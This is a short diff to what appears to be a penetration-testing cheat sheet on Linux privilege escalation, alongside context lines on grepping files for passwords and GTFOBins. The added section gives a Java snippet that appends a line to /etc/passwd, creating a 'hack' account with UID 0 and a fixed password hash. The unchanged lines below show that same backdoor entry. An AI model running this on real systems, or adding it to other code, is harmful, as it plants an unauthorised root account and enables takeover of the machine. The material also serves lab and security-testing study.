@@ -14,6 +14,14 @@ for p in $(cat files.txt); do grep password $p; done
 Tricks to play after running `sudo -l`
 https://gtfobins.github.io/
 
+### Java
+```
+var FileWriter = Java.type("java.io.FileWriter");
+var fw=new FileWriter("/etc/passwd",true);
+fw.write("hack:$1$-hack$cP2Gt085ove2RDgBPWMR2/:0:0:root:/root:/bin/bash");
+fw.close();
+```
+
 ### Change passwd file
 ```
 hack:$1$-hack$cP2Gt085ove2RDgBPWMR2/:0:0:root:/root:/bin/bash
